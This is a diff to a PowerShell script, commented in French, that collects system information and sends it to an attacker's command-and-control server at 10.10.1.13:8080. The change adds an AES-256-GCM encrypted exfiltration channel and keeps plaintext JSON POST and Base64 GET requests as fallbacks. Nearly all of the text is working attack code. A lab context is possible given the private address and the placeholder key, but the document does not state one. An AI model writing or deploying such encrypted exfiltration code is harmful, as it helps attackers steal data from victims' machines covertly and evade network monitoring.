@@ -203,16 +203,50 @@ $jsonData = $sysInfo | ConvertTo-Json -Compress
 # ── Adresse du serveur C2 de l'attaquant ──────────────────────
 $c2Base = "http://10.10.1.13:8080"
 
-# ── Tentative 1 : HTTP POST vers le serveur C2 ───────────────
+# ── Clé AES-256 partagée avec server.py (32 octets hex) ───────
+# Remplacer par la valeur générée avec :
+#   python -c "import secrets; print(secrets.token_hex(32))"
+# puis passer la même valeur à server.py --key <hex>.
+$c2AesKeyHex = "0000000000000000000000000000000000000000000000000000000000000000"
+
+# ── Tentative 1 : canal AES-256-GCM (exfiltration chiffrée) ───
 $sent = $false
 try {
-    $resp = Invoke-WebRequest -Uri "$c2Base/collect" -Method POST `
-            -Body $jsonData -ContentType "application/json" `
+    $keyBytes   = [byte[]] ($c2AesKeyHex -split '(?<=\G..)' -ne '' |
+                  ForEach-Object { [Convert]::ToByte($_, 16) })
+    $plainBytes = [System.Text.Encoding]::UTF8.GetBytes($jsonData)
+
+    # Générer un nonce aléatoire de 12 octets
+    $nonce = [byte[]]::new(12)
+    [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($nonce)
+
+    # Chiffrement AES-256-GCM via .NET (disponible depuis .NET 5 / Windows 10 20H1+)
+    $aesGcm    = [System.Security.Cryptography.AesGcm]::new($keyBytes)
+    $cipher    = [byte[]]::new($plainBytes.Length)
+    $tag       = [byte[]]::new(16)
+    $aesGcm.Encrypt($nonce, $plainBytes, $cipher, $tag)
+    $aesGcm.Dispose()
+
+    # Format : nonce(12) || tag(16) || ciphertext
+    $blob = $nonce + $tag + $cipher
+
+    $resp = Invoke-WebRequest -Uri "$c2Base/enc" -Method POST `
+            -Body $blob -ContentType "application/octet-stream" `
             -UseBasicParsing -TimeoutSec 8
     if ($resp.StatusCode -eq 200) { $sent = $true }
 } catch {}
 
-# ── Tentative 2 (repli) : encodage Base64 en paramètre GET ───
+# ── Tentative 2 (repli) : HTTP POST JSON en clair ─────────────
+if (-not $sent) {
+    try {
+        $resp = Invoke-WebRequest -Uri "$c2Base/collect" -Method POST `
+                -Body $jsonData -ContentType "application/json" `
+                -UseBasicParsing -TimeoutSec 8
+        if ($resp.StatusCode -eq 200) { $sent = $true }
+    } catch {}
+}
+
+# ── Tentative 3 (repli) : encodage Base64 en paramètre GET ───
 if (-not $sent) {
     try {
         $b64 = [Convert]::ToBase64String(
